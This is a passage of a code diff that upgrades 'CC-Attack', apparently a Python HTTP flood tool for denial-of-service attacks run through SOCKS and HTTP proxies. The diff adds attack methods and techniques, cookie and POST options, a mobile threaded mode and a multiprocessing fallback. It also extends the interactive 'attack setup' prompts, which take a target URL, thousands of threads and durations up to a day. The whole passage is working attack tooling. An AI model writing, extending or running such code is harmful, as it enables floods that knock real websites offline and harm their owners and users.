+            last_time = now
+
+            sys.stdout.write(
+                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
+                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
+                f"| {C.RED}errs:{C.RESET} {handler.stats_errors:<7}  "
+                f"| {C.YEL}MB:{C.RESET} {handler.stats_bytes / 1048576:>7.2f}"
+            )
+            sys.stdout.flush()
+    except KeyboardInterrupt:
+        Log.warn("Interrupt — stopping…")
+    finally:
+        stop_event.set()
+        print()
+        total_time = max(1e-6, time.time() - start)
+        Log.ok(f"Done. Sent: {handler.stats_sent}, "
+               f"errors: {handler.stats_errors}, "
+               f"traffic: {handler.stats_bytes / 1048576:.2f} MB, "
+               f"avg RPS: {handler.stats_sent / total_time:.0f}")
+    return 0
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -623,6 +1236,9 @@ def _check_one_fast(line, proxy_type, ms):
 
 def check_proxies(proxies, proxy_type, ms=3, workers=800,
                   autosave_path=None, autosave_every=5, top_n=500):
+    if IS_TERMUX:
+        workers = min(workers, 200)
+
     Log.info(f"Checking {len(proxies)} proxies (timeout={ms}s, workers={workers})…")
     alive = []
     done = 0
@@ -708,7 +1324,7 @@ def check_proxies(proxies, proxy_type, ms=3, workers=800,
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  RUN_ATTACK (multiprocessing + live stats)
+#  RUN_ATTACK
 # ─────────────────────────────────────────────────────────────────────────────
 def run_attack(cfg):
     url = cfg["url"]
@@ -753,14 +1369,17 @@ def run_attack(cfg):
         out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")
 
     Log.info(f"Target  : {protocol}://{target}:{port}{path}")
-    Log.info(f"Threads per proc: {cfg['threads']}  |  "
-             f"Proxies: {len(proxies)}  |  "
-             f"Pipeline: {cfg['pipeline']}  |  KA: {cfg['keepalive']}")
+    Log.info(f"Method  : {cfg.get('method', 'GET')}")
+    Log.info(f"Technique: {cfg.get('technique', 'flood')}")
 
-    # ── Мультипроцессинг ─────────────────────────────────────────────
+    if IS_TERMUX:
+        Log.info(f"THREADED mode | Threads: {cfg['threads']}  |  "
+                 f"Pipeline: {cfg['pipeline']}  |  KA: {cfg['keepalive']}")
+        return _run_threaded(cfg, proxies, mp.cpu_count())
+
     cpu_count = mp.cpu_count()
-    Log.info(f"Starting {cpu_count} processes × {cfg['threads']} threads "
-             f"= {cpu_count * cfg['threads']} total threads")
+    Log.info(f"MULTIPROCESSING mode | {cpu_count} processes × "
+             f"{cfg['threads']} threads = {cpu_count * cfg['threads']} total")
 
     proc_cfg = {
         "target": target, "path": path,
@@ -768,102 +1387,19 @@ def run_attack(cfg):
         "proxy_type": proxy_type,
         "pipeline": cfg["pipeline"],
         "keepalive": cfg["keepalive"],
+        "cookies": cfg.get("cookies", ""),
+        "post_data": cfg.get("post_data", ""),
+        "brute": cfg.get("brute", False),
+        "method": cfg.get("method", "GET"),
+        "technique": cfg.get("technique", "flood"),
     }
 
-    result_q = mp.Queue()
-    stop_flag = mp.Value("b", 0)
-
-    processes = []
-
     try:
-        for _ in range(cpu_count):
-            p = mp.Process(
-                target=_proc_worker,
-                args=(proc_cfg, proxies, cfg["threads"],
-                      cfg["period"], result_q, stop_flag),
-                daemon=False,
-            )
-            p.start()
-            processes.append(p)
+        return _run_multiprocessing(cfg, proxies, proc_cfg, cpu_count)
     except Exception as e:
-        Log.err(f"Failed to start processes: {e}")
-        return 1
-
-    # ── Прогресс-бар в главном процессе ─────────────────────────────
-    start = time.time()
-    sent_total = 0
-    errors_total = 0
-    bytes_total = 0
-    last_sent = 0
-    last_time = start
-
-    try:
-        while time.time() - start < cfg["period"]:
-            time.sleep(1)
-            elapsed = max(1e-6, time.time() - start)
-
-            # 🆕 Собираем ЛЮБЫЕ доступные пакеты из очереди (live)
-            got_any = False
-            while True:
-                try:
-                    ds, de, db, ts, te, tb = result_q.get_nowait()
-                    sent_total += ds
-                    errors_total += de
-                    bytes_total += db
-                    got_any = True
-                except queue.Empty:
-                    break
-
-            now = time.time()
-            dt = now - last_time
-            inst_rps = (sent_total - last_sent) / dt if dt > 0 else 0
-            last_sent = sent_total
-            last_time = now
-
-            sys.stdout.write(
-                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
-                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
-                f"| {C.RED}errs:{C.RESET} {errors_total:<7}  "
-                f"| {C.YEL}MB:{C.RESET} {bytes_total / 1048576:>7.2f}"
-            )
-            sys.stdout.flush()
-    except KeyboardInterrupt:
-        Log.warn("Interrupt — stopping…")
-    finally:
-        stop_flag.value = 1
-
-        # Дать процессам завершиться корректно
-        deadline = time.time() + 2.0
-        for p in processes:
-            remain = max(0.1, deadline - time.time())
-            p.join(timeout=remain)
-
-        # Добить живые
-        for p in processes:
-            if p.is_alive():
-                p.terminate()
-        for p in processes:
-            if p.is_alive():
-                p.join(timeout=1)
-
-        print()
-
-        # Финальный сбор всей очереди
-        while True:
-            try:
-                ds, de, db, ts, te, tb = result_q.get_nowait()
-                sent_total += ds
-                errors_total += de
-                bytes_total += db
-            except queue.Empty:
-                break
-
-        total_time = max(1e-6, time.time() - start)
-        Log.ok(f"Done. Sent: {sent_total}, errors: {errors_total}, "
-               f"traffic: {bytes_total / 1048576:.2f} MB, "
-               f"avg RPS: {sent_total / total_time:.0f}")
-
-    return 0
+        Log.err(f"Multiprocessing failed: {e}")
+        Log.warn("Falling back to THREADED mode…")
+        return _run_threaded(cfg, proxies, cpu_count)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -891,7 +1427,7 @@ def _prompt(label, default=None, cast=str, validator=None):
 
 def interactive_cli():
     print(f"{C.DIM}{'-' * 60}{C.RESET}")
-    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (HP){C.RESET}")
+    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (MEGA+){C.RESET}")
     print(f"{C.DIM}{'-' * 60}{C.RESET}\n")
 
     while True:
@@ -900,17 +1436,34 @@ def interactive_cli():
             break
         Log.err("URL must start with http:// or https://")
 
-    proxy_ver = _prompt("Mode (4/5/http)", default="5",
+    print(f"{C.DIM}  Methods: {', '.join(ALL_METHODS)}{C.RESET}")
+    method = _prompt("Method", default="GET", cast=lambda x: x.upper(),
+                     validator=lambda x: x in ALL_METHODS)
+
+    print(f"{C.DIM}  Techniques: {', '.join(TECHNIQUES)}{C.RESET}")
+    technique = _prompt("Technique", default="flood",
+                        cast=lambda x: x.lower(),
+                        validator=lambda x: x in TECHNIQUES)
+
+    print(f"{C.DIM}  Modes: 4 (SOCKS4), 5 (SOCKS5), http{C.RESET}")
+    proxy_ver = _prompt("Mode", default="5",
                         validator=lambda x: x in ("4", "5", "http"))
 
     ans = _prompt("Proxies — download fresh? (y/n)", default="y",
                   cast=lambda x: x.lower())
     down = ans in ("y", "yes", "д", "да", "")
 
-    default_t = max(100, 2000 // max(1, mp.cpu_count()))
-    threads = _prompt(f"Threads per process (CPU×{mp.cpu_count()})",
-                      default=default_t, cast=int,
-                      validator=lambda x: 1 <= x <= 5000)
+    if IS_TERMUX:
+        label_threads = "Threads (total, Termux)"
+        default_t = 200
+        tmax = 500
+    else:
+        default_t = max(100, 2000 // max(1, mp.cpu_count()))
+        label_threads = f"Threads per process (CPU×{mp.cpu_count()})"
+        tmax = 5000
+
+    threads = _prompt(label_threads, default=default_t, cast=int,
+                      validator=lambda x: 1 <= x <= tmax)
 
     period = _prompt("Duration (sec)", default=60, cast=int,
                      validator=lambda x: 1 <= x <= 86400)
@@ -920,6 +1473,12 @@ def interactive_cli():
 
     keepalive = _prompt("Keep-Alive (1..100000)", default=KEEPALIVE_PER_SOCKET,
                         cast=int, validator=lambda x: 1 <= x <= 100000)
+
+    cookies = _prompt("Cookies", default="")
+
+    ans = _prompt("Brute TCP_NODELAY? (y/n)", default="n",
+                  cast=lambda x: x.lower())
+    brute = ans in ("y", "yes", "д", "да")
 
     ans = _prompt("Check proxies? (y/n)", default="y",
                   cast=lambda x: x.lower())
@@ -937,16 +1496,24 @@ def interactive_cli():
                         cast=int, validator=lambda x: 1 <= x <= 20000)
 
     print(f"\n{C.DIM}{'-' * 60}{C.RESET}")
-    print(f"{C.BOLD}{C.WHT}  Summary (HP){C.RESET}")
+    print(f"{C.BOLD}{C.WHT}  Summary (MEGA+){C.RESET}")
     print(f"{C.DIM}{'-' * 60}{C.RESET}")
     print(f"  {C.CYN}Target       :{C.RESET} {url}")
+    print(f"  {C.CYN}Method       :{C.RESET} {method}")
+    print(f"  {C.CYN}Technique    :{C.RESET} {technique}")
     print(f"  {C.CYN}Mode         :{C.RESET} {proxy_ver}")
-    print(f"  {C.CYN}Processes    :{C.RESET} {mp.cpu_count()}")
-    print(f"  {C.CYN}Threads/proc :{C.RESET} {threads}")
-    print(f"  {C.CYN}Total threads:{C.RESET} {mp.cpu_count() * threads}")
+    print(f"  {C.CYN}Mode engine  :{C.RESET} {'THREADED' if IS_TERMUX else 'MULTIPROCESSING'}")
+    if IS_TERMUX:
+        print(f"  {C.CYN}Threads      :{C.RESET} {threads}")
+    else:
+        print(f"  {C.CYN}Processes    :{C.RESET} {mp.cpu_count()}")
+        print(f"  {C.CYN}Threads/proc :{C.RESET} {threads}")
+        print(f"  {C.CYN}Total threads:{C.RESET} {mp.cpu_count() * threads}")
     print(f"  {C.CYN}Duration     :{C.RESET} {period}s")
     print(f"  {C.CYN}Pipeline     :{C.RESET} {pipeline}")
     print(f"  {C.CYN}Keep-Alive   :{C.RESET} {keepalive}")
+    print(f"  {C.CYN}Cookies      :{C.RESET} {cookies[:30] if cookies else '—'}")
+    print(f"  {C.CYN}Brute        :{C.RESET} {'YES' if brute else 'NO'}")
     print(f"  {C.CYN}Download     :{C.RESET} {'YES' if down else 'NO'}")
     print(f"  {C.CYN}Check        :{C.RESET} {'YES' if do_check else 'NO'}"
           + (f" (top-{top_n})" if do_check else ""))
@@ -960,12 +1527,17 @@ def interactive_cli():
 
     cfg = {
         "url": url,
+        "method": method,
+        "technique": technique,
         "proxy_ver": proxy_ver,
         "threads": threads,
         "period": period,
         "pipeline": pipeline,
         "keepalive": keepalive,
         "out_file": "proxy.txt",
+        "cookies": cookies,
+        "brute": brute,
+        "post_data": "",
         "down": down,
         "check": do_check,
         "check_to": check_to,
@@ -975,18 +1547,21 @@ def interactive_cli():
     return run_attack(cfg)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  MAIN
+# ─────────────────────────────────────────────────────────────────────────────#  MAIN
 # ─────────────────────────────────────────────────────────────────────────────
 def main() -> int:
     if len(sys.argv) > 1:
         p = argparse.ArgumentParser(prog="cc.py", add_help=False)
         p.add_argument("-h", "-help", "--help", action="store_true")
         p.add_argument("-url")
+        p.add_argument("-method", default="GET")
+        p.add_argument("-technique", default="flood")
         p.add_argument("-v", default="5")
-        p.add_argument("-t", type=int, default=800)
+        p.add_argument("-t", type=int, default=200)
         p.add_argument("-f", default="proxy.txt")
         p.add_argument("-s", type=int, default=60)
+        p.add_argument("-cookies", default="")
+        p.add_argument("-b", default="0")
         p.add_argument("-down", action="store_true")
         p.add_argument("-check", action="store_true")
         p.add_argument("-check-to", type=int, default=3)
@@ -997,19 +1572,25 @@ def main() -> int:
         args = p.parse_args()
 
         if args.help:
-            print(f"CC-Attack v{VERSION} HP — by DIDO")
-            print("Run without arguments for interactive mode.")
+            print(f"CC-Attack v{VERSION} MEGA+ — by DIDO")
+            print(f"Methods: {', '.join(ALL_METHODS)}")
+            print(f"Techniques: {', '.join(TECHNIQUES)}")
             return 0
 
         print_banner()
         cfg = {
             "url": args.url or "",
+            "method": args.method,
+            "technique": args.technique,
             "proxy_ver": args.v,
             "threads": args.t,
             "period": args.s,
             "pipeline": args.pipeline,
             "keepalive": args.keepalive,
             "out_file": args.f,
+            "cookies": args.cookies,
+            "brute": args.b == "1",
+            "post_data": "",
             "down": args.down,
             "check": args.check,
             "check_to": args.check_to,
